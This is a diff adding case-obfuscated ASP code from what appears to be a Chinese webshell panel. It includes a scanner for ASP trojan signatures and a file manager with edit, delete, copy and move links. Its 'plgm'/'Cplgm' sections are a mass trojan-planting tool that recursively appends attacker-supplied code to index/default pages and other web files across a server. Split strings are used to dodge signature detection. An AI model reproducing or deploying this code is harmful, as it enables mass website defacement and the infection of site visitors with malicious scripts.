+		rRs "<input name=""path"" type=""text"" style=""border:1px solid #999"" value=""."" size=""30"" /> 填“\”网站根目录；“.”为本程序目录<br><br>"
+		RrS "你要干什么: <input class=c name=""radiobutton"" type=""radio"" value=""sws"" onClick=""document.getElementById('showFile1').style.display='none'"" checked>查ASP 马"
+		rrs "<input class=c type=""radio"" name=""radiobutton"" value=""sf"" onClick=""document.getElementById('showFile1').style.display=''"">搜索符合条件之文件<br>"
+		rRs "<br /><div id=""showFile1"" style=""display:none"">"
+		RRS "&nbsp;&nbsp;查找内容：<input name=""Search_Content"" type=""text"" id=""Search_Content"" style=""border:1px solid #999"" size=""20"">"
+		rRS " 要查找的字符串，不填就只进行日期检查<br />"
+		RRs "&nbsp;&nbsp;修改日期：<input name=""Search_Date"" type=""text"" style=""border:1px solid #999"" value="""&lEFT(NOw(),inSTr(now()," ")-1)&""" size=""20""> 多个日期用;隔开，任意日期填写 <a href=""#"" onClick=""javascript:form1.Search_Date.value='ALL'"">ALL</a><br />"
+		rRS "&nbsp;&nbsp;文件类型：<input name=""Search_FileExt"" type=""text"" style=""border:1px solid #999"" value=""*"" size=""20""> 类型之间用,隔开，*表示所有类型<br /><br /></div>"
+		rrs "<input type=""submit"" value="" 开始扫描 "" style=""background:#ccc;border:2px solid #EEB422;padding:2px 2px 0px 2px;margin:4px;"" />"
+		RrS "</form>"
+	eLsE
+		If RequESt.Form("path")="" ThEn
+			RrS("路径不能为空")
+			RESpOnsE.end()
+		eND iF
+		if REQuEst.FoRM("path")="\" THEN
+			TmpPaTh = SERvER.mApPatH("\")
+		elSeif REQUESt.fOrm("path")="." TheN
+			TmPPatH = serVer.mAPPATH(".")
+		ELse
+			TMpPAth = rEQuEST.foRM("path")
+		ENd If
+		
+		TiMeR1 = tImEr
+		SUn = 0
+		sUmfilES = 0
+		SUMfolDERS = 1
+		iF reqUeST.FOrm("radiobutton") = "sws" theN
+			dimfiLEext = "asp,cer,asa,cdx"
+			CAlL sHoWaLlfilE(tmPpAtH)
+		ElSE
+			If requEsT.FOrm("path") = "" oR requeST.FOrM("Search_Date") = "" Or ReQuEst.fOrM("Search_FileExt") = "" thEN
+				RRs("缉捕条件不完全<br><br><a href='javascript:history.go(-1);'>请返回重新输入</a>")
+				REsPONsE.End()
+			eND If
+			dImFILEExt = ReqUeSt.ForM("Search_fileExt")
+			cALl sHowaLlfIlE2(TmpPAtH)
+		eND if
+RRS "<table width=""100%"" border=""0"" cellpadding=""0"" cellspacing=""0"" style='font-size:12px'>"
+RRS "<tr><td style=""padding:5px;line-height:170%;clear:both;font-size:12px"">"
+RRS "<div id=""updateInfo"" style=""background:ffffe1;border:1px solid #89441f;padding:4px;display:none""></div>"
+RRS "扫描完毕！一共检查文件夹<font color=""#FF0000"">"&SuMFOlDERs&"</font>个，文件<font color=""#FF0000"">"&sumFiLeS&"</font>个，发现可疑点<font color=""#FF0000"">"&SuN&"</font>个"
+RRS "<table width=""100%"" border=""1"" cellpadding=""0"" cellspacing=""8"" bordercolor=""#999999"" style=""font-size:12px;border-collapse:collapse;line-height:130%;clear:both;""><tr>"
+If REQueSt.FoRm("radiobutton") = "sws" ThEN
+RRS "<td width=""20%"">文件相对路径</td>"
+RRS "<td width=""20%"">特征码</td>"
+RRS "<td width=""40%"">描述</td>"
+RRS "<td width=""20%"">创建/修改时间</td>"
+Else   
+RRS "<td width=""50%"">文件相对路径</td>"
+RRS "<td width=""25%"">文件创建时间</td>"
+RRS "<td width=""25%"">修改时间</td>"
+End If
+RRS "</tr>"
+RRS Report
+RRS "<br/></table>"
+TIMer2 = tiMER
+tHETiME=cSTR(INT(((TIMer2-TiMER1)*10000 )+0.5)/10)
+RRs "<br><font style='font-size:12px'>本页执行共用了"&tHETiME&"毫秒</font>"
+End IF
+SUB sHoWaLlFIlE(pATh)
+SET f1SO = CReAteOBjECt("Scripting.FileSystemObject")
+if not F1SO.FolderExists(PAth) ThEN ExIt sUB
+Set F = F1sO.GeTFolDeR(PATH)
+Set fC2 = f.FiLes
+for eaCh MyFILE IN FC2
+if CHeckExt(F1sO.GetEXTEnsIONnAme(paTh&"\"&MyFile.namE)) THen
+Call SCanFile(pAtH&tEMp&"\"&mYfIle.Name, "")
+SumFiles = sUMfiLes + 1
+End If
+Next
+SEt FC = f.sUBfolDeRs
+for EaCh F1 iN fC
+ShoWallFIlE PatH&"\"&f1.nAMe
+sUMfolDERS = SumFolders + 1
+NExt
+SET f1SO = NOtHinG
+END SUB
+suB SCanFILe(FIlepATh, iNFile)
+SErVeR.scriptTiMeouT=999999999
+If InfilE <> "" tHeN
+INfiLes = "<font color=red>该文件被<a href=""http://"&REQUEsT.ServerVaRIablES("server_name")&"/"&TuRlENCoDE(INFIle)&""" target=_blank>"& iNFILE & "</a>文件包含执行</font>"
+End iF
+SET fsO1S = CReatEobjEct("Scripting.FileSystemObject")
+On ERrOr ReSuMe neXt
+SET ofILE = FsO1s.OPENtEXtfilE(fILEpAth)
+FILETxT = lcaSE(ofIle.rEAdAlL())
+iF ErR ThEn eXIt SUb END IF
+IF Len(fiLeTXt)>0 THeN
+FILETXt = vBCRlF & FILetxT
+Temp = "<a href=""http://"&rEQUEST.SERVerVARIAblEs("server_name")&"/"&TuRlencoDE(rEplACE(rePlACe(FIlePATh,SerVeR.MAPpAth("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&rePLaCE(fIlEpAtH,sERver.mAPPath("\")&"\","",1,1,1)&"</a><br />"
+    tEMP=TEMp&"<a href='javascript:FullForm("""&replacE(rePlACe(filepaTH,serVEr.MaPpAth("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
+	TEmP=Temp&"<a href='javascript:FullForm("""&REPLaCE(rEPlACE(fIlEpaTh,SERver.maPpaTh("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
+	teMP=tEMp&"<a href='javascript:FullForm("""&repLAcE(REplACE(filePAtH,sErVer.mAPpAtH("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
+	temP=teMp&"<a href='javascript:FullForm("""&rEPlAcE(rEplACe(fILEpath,sErVEr.MAPpAth("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
+			IF InsTR( filetxt, lCAsE("WScr"&DOMyBest&"ipt.Shell") ) OR INSTr( filEtXt, lCaSE("clsid:72C24DD5-D70A"&DOmYbEST&"-438B-8A42-98424B88AFB8") ) tHEN
+				rEpoRt = rEPoRt&"<tr><td>"&TEmP&"</td><td>WScr"&dOMyBEsT&"ipt.Shell 或者 clsid:72C24DD5-D70A"&DOMybEsT&"-438B-8A42-98424B88AFB8</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&infiLEs&"</td><td>"&GeTDAtECReate(FILepATH)&"<br>"&getdaTeMODIFy(fILePAtH)&"</td></tr>"
+				sUn = Sun + 1
+tEmp="-同上-"
+End If
+IF iNstr( filETXT, lCAsE("She"&domybest&"ll.Application") ) OR iNstr( fIlETXT, lCASE("clsid:13709620-C27"&DOMybEST&"9-11CE-A49E-444553540000") ) ThEn
+RePORt = rEPoRT&"<tr><td>"&Temp&"</td><td>She"&DOMYbeSt&"ll.Application 或者 clsid:13709620-C27"&dOmYbESt&"9-11CE-A49E-444553540000</td><td><font color=red>危险组件，一般被ASP木马利用</font>"&iNfiLES&"</td><td>"&gETDATeCrEAtE(FIlePAth)&"<br>"&gETDaTEmoDify(FilepAtH)&"</td></tr>"
+Sun = Sun + 1
+Temp="-同上-"
+End iF
+seT reGEx = NEW ReGexP
+reGex.iGnOrEcasE = tRUe
+reGex.gLobaL = TRue
+REgEx.PAtTErn = "\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript).encode\b"
+IF rEgex.tesT(FiLetxt) THEn
+RePORt = RePOrt&"<tr><td>"&temP&"</td><td>(vbscript|jscript|javascript).Encode</td><td><font color=red>似乎脚本被加密了</font>"&iNfiLES&"</td><td>"&gETDATeCReaTe(FIlePatH)&"<br>"&getdATEModIfY(FILEPATh)&"</td></tr>"
+				SUN = SUn + 1
+				TEMP="-同上-"
+			ENd IF
+			rEgEX.PattErN = "\bEv"&"al\b"
+			IF rEGEx.TeSt(fiLeTxt) tHen
+				rEPOrt = repOrT&"<tr><td>"&tEMP&"</td><td>Ev"&"al</td><td>e"&"val()函数可以执行任意ASP代码<br>但是javascript代码中也可以使用，有可能是误报。"&iNFiLES&"</td><td>"&GEtDatEcReATE(FIlePath)&"<br>"&getDATEModIFY(FiLepaTH)&"</td></tr>"
+				SuN = suN + 1
+				tEmP="-同上-"
+			EnD if
+			RegEX.patterN = "[^.]\bExe"&"cute\b"
+			if regex.TESt(FileTxt) tHEn
+				rePOrT = REPort&"<tr><td>"&TEMp&"</td><td>Exec"&"ute</td><td><font color=red>e"&"xecute()函数可以执行任意ASP代码</font><br>"&iNFIles&"</td><td>"&gETdatEcreAtE(fIlEpath)&"<br>"&GeTdatEModiFY(FiLEpaTh)&"</td></tr>"
+				SUN = Sun + 1
+				temP="-同上-"
+			EnD if
+			RegeX.pAtTErN = "\.(Open|Create)TextFile\b"
+			if rEGEX.TEst(fileTXT) tHEn
+				RepOrT = RepORT&"<tr><td>"&TEmP&"</td><td>.CreateTextFile|.OpenTextFile</td><td>使用了FSO的CreateTextFile|OpenTextFile读写文件"&InFIlES&"</td><td>"&GeTDaTeCrEATE(FiLEpatH)&"<br>"&getdAtEmoDify(fIlePATH)&"</td></tr>"
+				SUn = sun + 1
+				teMP="-同上-"
+			eNd iF
+			Regex.pAtTeRn = "\.SaveToFile\b"
+			if rEgEX.TESt(filetXt) thEn
+				repORT = rEPOrT&"<tr><td>"&tEMp&"</td><td>.SaveToFile</td><td>使用了Stream的SaveToFile函数写文件"&INfilEs&"</td><td>"&gEtdAtEcREate(FILEPATh)&"<br>"&GETdaTemOdiFy(filepATH)&"</td></tr>"
+				suN = sUN + 1
+				TEMP="-同上-"
+			End IF
+			REgeX.paTTerN = "\.Save\b"
+			iF rEgeX.TeST(Filetxt) ThEN
+				rEPOrt = rePORT&"<tr><td>"&TEMp&"</td><td>.Save</td><td>使用了XMLHTTP的Save函数写文件"&InFilES&"</td><td>"&GETDateCREatE(fIlEpATh)&"<br>"&GeTdateMOdifY(fiLepAth)&"</td></tr>"
+				SUN = sUN + 1
+				tEMP="-同上-"
+			End iF
+		sET rEgex = nOThING
+		sET reGEX = New REGEXp
+		ReGeX.IGnOReCaSe = tRuE
+		rEgeX.glOBal = TRue
+		reGex.pATTern = "<!--\s*#include\s*file\s*=\s*"".*"""
+		set matcHEs = rEGEx.EXeCutE(FiLeTXT)
+		for Each MATcH iN MaTches
+			tfIle = rePlacE(mid(MATCH.VaLue, InStr(MaTCh.vALue, """") + 1, lEn(MATCH.VALUe) - InSTr(mAtcH.VALUe, """") - 1),"/","\")
+			iF NOT chECkext(FSO1S.gEtexteNSiONnAMe(tFILE)) tHeN
+				CAlL ScANfiLE( miD(fILEPATh,1,INstrReV(FILEpath,"\"))&TfIle, rEplACe(FiLepaTH,serVEr.mapPaTh("\")&"\","",1,1,1) )
+				SuMfILEs = sUmfILes + 1
+			end If
+		NeXt
+		sEt MAtChES = notHING
+		SEt REGex = nOthiNG
+		seT REgex = NeW rEGexP
+		REgEX.igNoRecase = tRuE
+		ReGEx.gLobal = tRUe
+		regeX.PAttErn = "<!--\s*#include\s*virtual\s*=\s*"".*"""
+		set matChes = regex.exeCUTe(FIlEtxt)
+		FOR eAcH MAtcH In MAtCHeS
+			tfiLe = repLAce(miD(mAtCh.vALUE, inStR(MatCh.ValUe, """") + 1, LEN(MaTcH.vALUE) - inSTR(MaTCH.Value, """") - 1),"/","\")
+			IF noT CHecKEXt(Fso1S.gETExtensiONNamE(tfiLe)) ThEN
+				Call SCaNFiLE( SErVeR.MappaTh("\")&"\"&TfIle, REpLAce(FILepath,SErvEr.maPpATh("\")&"\","",1,1,1) )
+				sumfILEs = sUMFILEs + 1
+			eNd iF
+		NeXt
+		seT mAtchES = NotHiNg
+		SeT rEGeX = nOThinG
+		SeT reGEX = NeW REGExp
+		reGeX.igNOrEcASe = TRue
+		ReGEx.gLoBal = TRUe
+		RegeX.pATTeRN = "Server.(Exec"&"ute|Transfer)([ \t]*|\()"".*"""
+		seT MatchEs = rEgeX.EXEcute(filEtXT)
+		for Each MAtCH iN mAtChES
+			tFile = repLACE(miD(MaTCh.VAlue, iNsTr(MaTcH.valUE, """") + 1, LEn(mAtCH.vALue) - iNstR(MATcH.vaLuE, """") - 1),"/","\")
+			if NOt cheCkExt(fso1S.GEteXtenSionNAme(TFIle)) tHeN
+				caLl scaNfIle( MiD(FILEPaTh,1,inSTRrev(FilEPaTh,"\"))&TfILE, RePlaCe(fiLEpATH,Server.MapPath("\")&"\","",1,1,1) )
+				sUmFiLEs = sumFILEs + 1
+			ENd If
+		NEXt
+		SeT MAtcHeS = NOthING
+		sEt REGEx = noThinG
+		Set regEx = New reGexp
+		rEgex.iGNorECase = TrUe
+		ReGEx.GLObaL = TrUe
+		reGeX.PaTtErn = "Server.(Exec"&"ute|Transfer)([ \t]*|\()[^""]\)"
+		iF regeX.tEst(fiLeTXt) thEN
+			Report = rePort&"<tr><td>"&TEMP&"</td><td>Server.Exec"&"ute</td><td><font color=red>不能跟踪检查Server.e"&"xecute()函数执行的文件。</font><br>"&inFilES&"</td><td>"&getdaTecReATE(FIlePAtH)&"<br>"&GETdaTEMoDIfy(filEPath)&"</td></tr>"
+			SUN = SuN + 1
+		end iF
+		SEt MaTChES = NothINg
+		sEt ReGeX = NotHiNg
+		SET xRegEX = nEw REGexp
+		XREGEX.IgNoreCaSE = tRUE
+		xrEgeX.gLoBaL = TRUe
+		xREgex.patTern = "<scr"&"ipt\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>"
+		SeT xMATcHes = XReGeX.exEcute(fIleTxT)
+		FOR Each MAtCH in xmATCHES
+			TMplAKE2 = mID(MAtCh.valuE, 1, InSTR(MaTch.vaLue, ">"))
+			SRCSeeK = inStr(1, Tmplake2, "src", 1)
+			If SrCSeek > 0 tHEn
+				srcsEEk2 = INSTr(SRcSEeK, tMPlAke2, "=")
+				for I = 1 tO 50
+					tmP = mid(TmPLake2, SRCSeEK2 + I, 1)
+					If tMP <> " " aND Tmp <> cHR(9) ANd Tmp <> vBCRLF thEN
+						EXIt for
+					eND If
+				neXt
+				IF tMP = """" thEN
+					TMPNamE = miD(TmpLaKE2, srcseEk2 + i + 1, insTR(sRCSeEk2 + I + 1, tMpLAKE2, """") - SRCseEk2 - i - 1)
+				elSE
+					If INstr(srCSeEk2 + I + 1, tMplAKE2, " ") > 0 ThEN TMPNamE = mid(TMPlAKe2, srCSeek2 + i, iNStr(SRCSeEK2 + i + 1, TMPlAkE2, " ") - sRCSeEK2 - I) eLsE TMPNAmE = TmPLAkE2
+					iF INsTR(TmpNaMe, CHr(9)) > 0 THEN tmPNaME = Mid(TmPNamE, 1, iNSTR(1, tMpnaME, Chr(9)) - 1)
+					IF instR(TMpnAMe, VbcrLf) > 0 tHEn TmPNamE = mID(TMpNaME, 1, instR(1, TMPNAMe, VBcrlF) - 1)
+					IF iNSTR(TMPName, ">") > 0 THeN TmpnaME = MID(tmPnaMe, 1, InSTr(1, TmPnAMe, ">") - 1)
+				End if
+				CAlL SCANfiLE( MId(FIlEpaTh,1,INSTRreV(filEPath,"\"))&TmpNAMe , repLACE(FiLePaTh,SeRVeR.MapPath("\")&"\","",1,1,1))
+				suMfIleS = sumfiLeS + 1
+			End if
+		nexT
+		Set MaTcHEs = NOthiNg
+		SeT ReGex = NOThIng
+		SEt Regex = NeW Regexp
+		RegeX.ignORECaSE = tRUe
+		regex.GlOBaL = trUe
+		REGEX.pATtERN = "CreateO"&"bject[ |\t]*\(.*\)"
+		sET MaTChEs = rEGeX.EXecute(fILETXT)
+		FoR eAch MATch In MatCHes
+			If InStr(maTCh.vaLuE, "&") or iNstR(MatcH.VALuE, "+") OR InStr(MaTCH.VALue, """") = 0 OR InStR(MAtcH.VaLUE, "(") <> InStrrEv(mAtCh.vAlUe, "(") tHen
+				rePOrT = rePoRT&"<tr><td>"&TemP&"</td><td>Creat"&"eObject</td><td>Crea"&"teObject函数使用了变形技术"&INFiles&"</td><td>"&GetdAtecReaTE(fiLEPath)&"<br>"&geTdAtEModify(fILEPatH)&"</td></tr>"
+				sUn = Sun + 1
+				EXIT sUb
+			End IF
+		NeXt
+		SEt MaTChES = nOThING
+		sET rEgEx = NoTHing
+	ENd if
+	sET ofilE = notHINg
+	set fso1S = NoThiNG
+END sub
+FunCtiOn cHEckEXT(FileeXT)
+	IF dIMFileExT = "*" TheN cHeckeXt = TrUE
+	EXT = sPLiT(dimFIleEXt,",")
+	FOr I = 0 TO UBOunD(EXT)
+		if lcAsE(fIlEexT) = ext(I) TheN 
+			ChecKEXT = tRUe
+			eXIt FUNCtION
+		enD if
+	NeXt
+ENd FUNcTION
+fUnCtIoN GetdaTeMoDiFy(fiLepaTh)
+	sET F2So = creAtEObjEct("Scripting.FileSystemObject")
+    SET F = F2sO.GeTFilE(FilePath) 
+	S = f.DATelastmoDIfied 
+	SEt F = NOTHIng
+	SEt F2so = NOThInG
+	geTDATEMoDiFy = s
+EnD FuNCtiOn
+FUncTion gEtDaTecReaTE(fILEPath)
+	sEt F3SO = cREAteoBjecT("Scripting.FileSystemObject")
+    sET f = F3SO.GETfilE(FILePAtH) 
+	S = F.DATEcrEATed 
+	SeT f = NOThING
+	sET F3So = NotHINg
+	geTdaTeCREAte = s
+enD fuNCtION
+fUnCTIon TURlENcodE(STR)
+	tEmP = REplAcE(StR, "%", "%25")
+	Temp = REPlaCE(TEMP, "#", "%23")
+	Temp = ReplACE(TEmP, "&", "%26")
+	tURlENcodE = Temp
+ENd functIOn
+sUB SHOWalLfiLe2(PaTH)
+	SEt f4so = crEateObjecT("Scripting.FileSystemObject")
+	iF Not F4sO.FolderExists(PAtH) THEn exIt sUb
+	SeT f = F4sO.GEtfOlDEr(patH)
+	SeT Fc2 = f.fiLES
+	FOR each mYfILE In Fc2
+		iF CHecKEXt(f4so.GeteXtenSioNnAMe(paTH&"\"&MYfILe.Name)) THEn
+			call IsFiNd(patH&"\"&MYfILe.namE)
+			sUmFILeS = sumFILEs + 1
+		enD If
+	NEXt
+	SET fC = F.SUbfoldErs
+	fOr EaCh f1 in fC
+		ShowALLFIlE2 PaTH&"\"&f1.nAMe
+		SUmFOldErs = sumfOlDers + 1
+    nEXt
+	SeT F4So = nOthiNG
+eNd sUb
+Sub IsfInD(thepaTh)
+	ThedAtE = GETDATEmODiFy(thepath)
+	On ERrOr reSuMe NEXt
+	THEtmP = mID(thEdaTe, 1, iNSTr(THedATe, " ") - 1)
+	iF ErR Then ExIT sUB
+	XdatE = SPlIt(REQUeST.fOrM("Search_Date"),";")
+	If requeST.ForM("Search_Date") = "ALL" THEN aLLtIME = TruE
+	FOr I = 0 TO UBOUnd(XDaTE)
+		If tHETMP = xDATE(i) oR alLtiMe = tRue Then 
+			If reQueSt("Search_Content") <> "" theN
+				set FSo2S = CreaTeOBjEcT("Scripting.FileSystemObject")
+				sET OfiLE = fso2S.opEnTeXTFile(ThEpATh, 1, FAlSE, -2)
+				fIleTXT = lCAsE(oFiLE.reADALL())
+				IF InSTR( FileTxt, LcASe(REQuEst.FORm("Search_Content"))) > 0 thEn
+					teMP = "<a href=""http://"&reQUeST.seRVERvAriAbLeS("server_name")&"/"&TUrLeNCOde(REplacE(rEPlAce(THEpATH,SErVer.mAppATh("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&REPlAce(THepAtH,sErVer.MAPpATH("\")&"\","",1,1,1)&"</a>"
+    TEMp=TeMp&" → <a href='javascript:FullForm("""&REplaCe(RepLAce(FilEpatH,serVer.MaPpatH("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
+	TEMP=tEmP&"<a href='javascript:FullForm("""&REPLAcE(rePLACe(FIlePAth,Server.mApPATH("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
+	teMp=tEmP&"<a href='javascript:FullForm("""&replace(REplace(fiLePaTH,sERVeR.mapPAth("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
+	Temp=temP&"<a href='javascript:FullForm("""&RePlAce(rePLAce(filEPAtH,serVeR.maPpaTh("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
+				REpoRT = repORt&"<tr><td height=30>"&tEmP&"</td><td>"&geTDaTeCrEate(tHePAtH)&"</td><td>"&tHedaTE&"</td></tr>"
+					RePoRt = rEPoRT&"<tr><td>"&tEMP&"</td><td>"&GeTdaTecreAtE(thePATh)&"</td><td>"&tHEDate&"</td></tr>"
+					suN = sun + 1
+					exit SuB
+				end if
+				OFiLe.ClOsE()
+				Set oFIlE = notHING
+				SEt FSo2s = NoThInG
+			ELsE
+				TEmp = "<a href=""http://"&ReqUEsT.SeRVErvariABLes("server_name")&"/"&turlencOdE(REPlacE(rEPlAcE(fILepaTH,serVEr.mApPAtH("\")&"\","",1,1,1),"\","/"))&""" target=_blank>"&rEpLAce(thePaTH,SERVER.MaPPaTh("\")&"\","",1,1,1)&"</a> "
+    tEMP=tEmP&"<a href='javascript:FullForm("""&rePlAce(rEPlacE(filEPaTH,SeRver.mapPaTH("\")&"\","",1,1,1),"\","\\")&""",""EditFile"")' class='am' title='编辑'>Edit</a> "
+	temp=TeMp&"<a href='javascript:FullForm("""&rEPlaCE(rePLACe(FilePaTh,serVer.mApPATh("\")&"\","",1,1,1),"\","\\")&""",""DelFile"")'  onclick='return yesok()' class='am' title='删除'>Del</a > "
+	TeMp=TEMP&"<a href='javascript:FullForm("""&rePLaCE(rEPLacE(FiLEpaTH,sERVER.MAPpatH("\")&"\","",1,1,1),"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
+	TeMp=TEMp&"<a href='javascript:FullForm("""&rePlace(RePlAcE(FILePaTH,sErVEr.mApPAth("\")&"\","",1,1,1),"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a>"	
+				rEPoRT = REpOrt&"<tr><td height=30>"&tEmp&"</td><td>"&geTDaTECreATE(tHePatH)&"</td><td>"&thEDAtE&"</td></tr>"
+				sun = SUN + 1
+				ExiT SUb
+			eND iF
+		ENd If
+	NeXT
+EnD sUb
+  CAsE "plgm"
+sERver.SCRIPttIMeOUT=1000000 
+rESPonse.BUFfeR=FaLSE 
+rrS ("<b>当前网站绝对路径:")&SeRVEr.maPpAtH("/")&("</b>")
+Asp_sELf=rEQUEsT.seRvErVARIaBLES("PATH_INFO") 
+S=rEquESt("fd") 
+IF S="" tHEN S=SeRVer.MAppaTH("/")
+EX=ReQueST("ex") 
+PTH=reQUEST("pth") 
+NewCnT=requEST("newcnt") 
+ADDcoDe = REQueST("code")
+if aDDCODe="" tHEn AdDcodE="你的代码"
+IF Ex<>"" AnD PTH<>"" THEN 
+selEcT caSE ex 
+CaSe "edit" 
+Call fIle_SHOW(PTH) 
+cAsE "save" 
+call FILe_sAVe(PtH) 
+ENd sElECT 
+ELSe 
+rRS("<form method=""POST""> ")
+RrS("<table width=560 border=""0"" style=""font-size:12px;"">")
+RRS("<tr>")
+RRS("<td width=""102"">要挂马的文件夹 (绝对路径)：</td>")
+Rrs("<td width=""359""><input type=""text"" name=""fd"" value="""&s&""" size=60></td>")
+rrs("<td width=""69"">&nbsp;</td>")
+rRs("</tr><tr><td>要挂马的代码:</td>")
+rrS("<td><textarea name=""code"" cols=58 rows=""3"">"&adDCOde&"</textarea></td>")
+RRS("<td><input name=""submit"" type=""submit"" value=""开始""></td>")
+RRS("</tr></table></form> ")
+End If 
+Function IsPattern(patt,str) 
+Set regEx=New RegExp 
+regEx.Pattern=patt 
+regEx.IgnoreCase=True 
+retVal=regEx.Test(str) 
+Set regEx=Nothing 
+If retVal=True Then 
+IsPattern=True 
+Else 
+IsPattern=False 
+End If 
+End Function 
+if request.form("submit")<>"" then
+If s="" or addcode="" Then
+RRS "<font color=red>请输入挂马的路径或代码!</font>"
+response.end
+else If IsPattern("[^ab]{1}:{1}(\\|\/)",s) Then sch s 
+End If
+end if 
+Sub sch(s) 
+oN eRrOr rEsUmE nExT 
+Set fs=Server.createObject("Scripting.FileSystemObject") 
+Set fd=fs.GetFolder(s) 
+Set fi=fd.Files 
+Set sf=fd.SubFolders 
+For Each f in fi 
+rtn=f.path 
+step_all rtn 
+Next 
+If sf.Count<>0 Then 
+For Each l In sf 
+sch l 
+Next 
+End If 
+End Sub 
+Sub step_all(agr) 
+retVal=IsPattern("(\\|\/)(default|index|505)\.(htm|html|asp|asa|aspx|php|jsp|cgi|js)\b",agr) 
+If retVal Then 
+step1 agr 
+step2 agr 
+Else 
+Exit Sub 
+End If 
+End Sub 
+Sub step1(str1)
+RRS "<div style='line-height:20px'>√ "&str1&" _"
+RRs "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DownFile"")' class='am' title='下载'>Down</a> "
+RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""EditFile"")' class='am' title='编辑'>edit</a> "
+RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""DelFile"")'onclick='return yesok()' class='am' title='删除'>Del</a> "
+RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""CopyFile"")' class='am' title='复制'>Copy</a> "
+RRS "<a href='javascript:FullForm("""&replace(str1,"\","\\")&""",""MoveFile"")' class='am' title='移动'>Move</a></div>"
+End Sub 
+Sub step2(str2) 
+Set fs=Server.createObject("Scripting.FileSystemObject") 
+isExist=fs.FileExists(str2) 
+If isExist Then 
+Set f=fs.GetFile(str2) 
+Set f_addcode=f.OpenAsTextStream(8,-2) 
+f_addcode.Write addcode 
+f_addcode.Close 
+Set f=Nothing 
+End If 
+Set fs=Nothing 
+End Sub 
+Err.Clear
+Case "Cplgm"
+Fpath=Request("fd")
+Addcode = Request("code")
+Addcode2 = Request("code2")
+pcfile=request("pcfile")
+checkbox=request("checkbox")
+ShowMsg=request("ShowMsg")
+FType=request("FType")
+M=request("M")
+if Ftype="" then Ftype="htm|html|asp|asa|aspx|php|jsp|cgi|cer|cdx"
+if Fpath="\" then Fpath=Server.MapPath("\")
+if Fpath="." or Fpath="" then Fpath=Server.MapPath(".")	
+if addcode="" then addcode="你的代码"
+if checkbox="" then checkbox=request("checkbox")
+if pcfile="" then
+PcFileName=Request.ServerVariables("SCRIPT_NAME")
+PcFilek=split(pcfileName,"/") 
+PcFilen=ubound(pcfilek) 
+PcFile=PcFilek(pcfilen) 
+End if
+RRS ("<b>网站根目录</b>- "&Server.MapPath("/")&"<br>")
+RRS ("<b>本程序目录</b>- "&Server.MapPath("."))
+RRS "<form method=POST><div style='color:#3399ff'><b>[" 
+if M="1" then RRS"批量挂马器-批量挂马"
+if M="2" then RRS"批量清马器-清除别人的网马"
+if M="3" then RRS"批量替换器-文件替换修改工具"
+if M="" then response.end
+RRS "]</b></div><table width=100% border=0><tr><td>文件路径：</td>"
+RRS "<td><input type=text name=fd value='"&Fpath&"' size=40> 填“\”即网站根目录；“.”为程序所在目录</td></tr>"
+if M="1" then RRS "<tr><td>过滤重复：</td><td><input class=c name='checkbox' type=checkbox value='checked' "&checkbox&"> 防止一个页面中有多个重复的代码</td></tr>"
+RRS "<tr><td>排除文件：</td>"
+RRS "<td><input name='pcfile' type=text id='pcfile' value='"&pcfile&"' size=40> 输入不想被修改的文件名，例如：1.asp|2.asp|3.asp</td></tr>"
+RRS "<tr><td>文件类型：</td>"
+RRS "<td><input name='FType' type=text id='FType' value='"&Ftype&"' size=40> 输入要修改的文件类型[扩展名]，例如：htm|html|asp|php|jsp|aspx|cgi</td></tr><tr><td><font color=#3399ff>"
+if M="1" then RRS"要挂的马："
+if M="2" then RRS"要清的马："
+if M="3" then RRS"查找内容："
+RRS"</font></td><td><textarea name=code cols=66 rows=3>"&addcode&"</textarea></td></tr>"
+if M="3" then RRS "<tr><td><font color=#3399ff>替 换 为：</font></td><td><textarea name=code2 cols=66 rows=3>"&addcode2&"</textarea></td></tr>"
+RRS "<tr><td></td><td> <input name=submit type=submit value=开始执行> --标记解释--[成功：√ ， 排除：× ， 重复：<font color=red>×</font>]</td></tr>"
+RRS "</table></form>" 
+if request("submit")="开始执行" then 
+RRS"<div style='line-height:25px'><b>执行记录：</b><br>"
+call InsertAllFiles(Fpath,addcode,pcfile)
+RRS"</div>"
+end if
+Sub InsertAllFiles(Wpath,Wcode,pc)
+Server.ScriptTimeout=999999999
+if right(Wpath,1)<>"\" then Wpath=Wpath &"\"
+Set WFSO = CreateObject("Scripting.FileSystemObject")
+on error resume next 
+Set f = WFSO.GetFolder(Wpath)
+Set fc2 = f.files
+For Each myfile in fc2
+Set FS1 = CreateObject("Scripting.FileSystemObject")
+FType1=split(myfile.name,".") 
+FType2=ubound(FType1) 
+if Ftype2>0 then
+FType3=LCase(FType1(FType2)) 
+else
+FType3="无"
+end if
+if Instr(LCase(pc),LCase(myfile.name))=0 and Instr(LCase(FType),FType3)<>0 then
+select case M
+case "1"
+if checkbox<>"checked" then
+Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
+tfile.writeline Wcode
+RRS"√ "&Wpath&myfile.name
+tfile.close
+else
+Set tfile1=FS1.opentextfile(Wpath&""&myfile.name,1,-2)
+if Instr(tfile1.readall,Wcode)=0 then
+Set tfile=FS1.opentextfile(Wpath&""&myfile.name,8,-2)
+tfile.writeline Wcode
